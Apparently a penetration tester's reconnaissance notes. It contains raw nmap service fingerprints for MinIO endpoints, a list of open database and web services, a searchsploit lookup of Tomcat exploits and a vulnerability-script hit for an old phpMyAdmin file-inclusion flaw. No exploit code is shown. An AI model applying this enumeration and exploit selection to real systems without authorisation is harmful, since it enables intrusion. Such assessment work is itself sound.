SF:ng=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x20
SF:Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Requ
SF:estId>18B9502A5E8168FC</RequestId><HostId>dd9025bab4ad464b049177c95eb6e
SF:bf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,59
SF:,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Mon,\x2015\x20J
SF:un\x202026\x2017:07:50\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x20
SF:400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20
SF:303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-T
SF:ransport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\x
SF:20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9
SF:251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x2018B9502DE06DB0D7\r\nX-Cont
SF:ent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\r
SF:\nDate:\x20Mon,\x2015\x20Jun\x202026\x2017:08:05\x20GMT\r\n\r\n<\?xml\x
SF:20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReques
SF:t</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Message
SF:><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>18B95
SF:02DE06DB0D7</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd
SF:1af9251148b658df7ac2e3e8</HostId></Error>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9001-TCP:V=7.98%I=7%D=6/15%Time=6A303165%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,702,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
SF:x20bytes\r\nContent-Length:\x201309\r\nContent-Security-Policy:\x20defa
SF:ult-src\x20'self'\x20'unsafe-eval'\x20'unsafe-inline';\x20script-src\x2
SF:0'self'\x20https://unpkg\.com;\x20\x20connect-src\x20'self'\x20https://
SF:unpkg\.com;\r\nContent-Type:\x20text/html\r\nLast-Modified:\x20Mon,\x20
SF:15\x20Jun\x202026\x2017:07:50\x20GMT\r\nReferrer-Policy:\x20strict-orig
SF:in-when-cross-origin\r\nServer:\x20MinIO\x20Console\r\nX-Content-Type-O
SF:ptions:\x20nosniff\r\nX-Frame-Options:\x20DENY\r\nX-Xss-Protection:\x20
SF:1;\x20mode=block\r\nDate:\x20Mon,\x2015\x20Jun\x202026\x2017:07:50\x20G
SF:MT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><meta\x20charset
SF:=\"utf-8\"/><base\x20href=\"/\"/><meta\x20content=\"width=device-width,
SF:initial-scale=1\"\x20name=\"viewport\"/><meta\x20content=\"#081C42\"\x2
SF:0media=\"\(prefers-color-scheme:\x20light\)\"\x20name=\"theme-color\"/>
SF:<meta\x20content=\"#081C42\"\x20media=\"\(prefers-color-scheme:\x20dark
SF:\)\"\x20name=\"theme-color\"/><meta\x20content=\"MinIO\x20Console\"\x20
SF:name=\"description\"/><meta\x20name=\"minio-license\"\x20content=\"agpl
SF:\"/><link\x20href=\"\./s")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,702,"HTTP/1\.
SF:0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x201309\r\
SF:nContent-Security-Policy:\x20default-src\x20'self'\x20'unsafe-eval'\x20
SF:'unsafe-inline';\x20script-src\x20'self'\x20https://unpkg\.com;\x20\x20
SF:connect-src\x20'self'\x20https://unpkg\.com;\r\nContent-Type:\x20text/h
SF:tml\r\nLast-Modified:\x20Mon,\x2015\x20Jun\x202026\x2017:07:50\x20GMT\r
SF:\nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nServer:\x20Min
SF:IO\x20Console\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:
SF:\x20DENY\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon,\x201
SF:5\x20Jun\x202026\x2017:07:50\x20GMT\r\n\r\n<!doctype\x20html><html\x20l
SF:ang=\"en\"><head><meta\x20charset=\"utf-8\"/><base\x20href=\"/\"/><meta
SF:\x20content=\"width=device-width,initial-scale=1\"\x20name=\"viewport\"
SF:/><meta\x20content=\"#081C42\"\x20media=\"\(prefers-color-scheme:\x20li
SF:ght\)\"\x20name=\"theme-color\"/><meta\x20content=\"#081C42\"\x20media=
SF:\"\(prefers-color-scheme:\x20dark\)\"\x20name=\"theme-color\"/><meta\x2
SF:0content=\"MinIO\x20Console\"\x20name=\"description\"/><meta\x20name=\"
SF:minio-license\"\x20content=\"agpl\"/><link\x20href=\"\./s");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9002-TCP:V=7.98%I=7%D=6/15%Time=6A303165%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,CE,"HTTP/1\.0\x20307\x20Temporary\x20Redirect\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLocation:\x20/timeou
SF:t\.html\r\nDate:\x20Mon,\x2015\x20Jun\x202026\x2017:07:50\x20GMT\r\nCon
SF:tent-Length:\x2049\r\n\r\n<a\x20href=\"/timeout\.html\">Temporary\x20Re
SF:direct</a>\.\n\n")%r(HTTPOptions,74,"HTTP/1\.0\x20307\x20Temporary\x20R
SF:edirect\r\nLocation:\x20/timeout\.html\r\nDate:\x20Mon,\x2015\x20Jun\x2
SF:02026\x2017:07:50\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,1CA,"HTTP/1\.0\x20404\x
SF:20Not\x20Found\r\nContent-Security-Policy:\x20script-src\x20'self'\x20h
SF:ttps://js\.hsforms\.net\x20https://www\.google\.com/recaptcha/\x20https
SF:://www\.gstatic\.com/recaptcha/;\x20object-src\x20'none';\x20frame-ance
SF:stors\x20'none';\x20frame-src\x20https://www\.google\.com/recaptcha/\x2
SF:0https://www\.gstatic\.com/recaptcha/\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nVary:\x20Accept-Encoding\r\nX-Content-Type-Options:\
SF:x20nosniff\r\nDate:\x20Mon,\x2015\x20Jun\x202026\x2017:08:05\x20GMT\r\n
SF:Content-Length:\x2019\r\n\r\n404\x20page\x20not\x20found\n")%r(LPDStrin
SF:g,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 703.97 seconds

```

# Identified Services
- 3306/tcp  open   mysql            MariaDB 11.8.6
- 5432/tcp  open   postgresql       PostgreSQL DB 9.6.0 or later
- 8081/tcp  open   http             Apache Tomcat 9.0.98
- 9000/tcp  open   http             Golang net/http server
- 9090/tcp  open   http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

## COA Development
- 8081/tcp  open   http             Apache Tomcat 9.0.98
```
┌──(kali㉿dco-ops)-[~]
└─$ searchsploit tomcat 9.0
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
Apache Tomcat 9.0.0.M1 - Cross-Site Scripting (XSS)                                             | multiple/webapps/50119.txt
Apache Tomcat 9.0.0.M1 - Open Redirect                                                          | multiple/webapps/50118.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code  | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code  | windows/webapps/42953.txt
Tomcat proprietaryEvaluate 9.0.0.M1 - Sandbox Escape                                            | java/webapps/47892.txt
------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results

```

- 9001/tcp  open   http             Golang net/http server
```
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: UNKNOWN (unable to test)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
```

- http://198.51.100.200:3001/settings/about
	- Uptime Kuma Version: 1.23.17
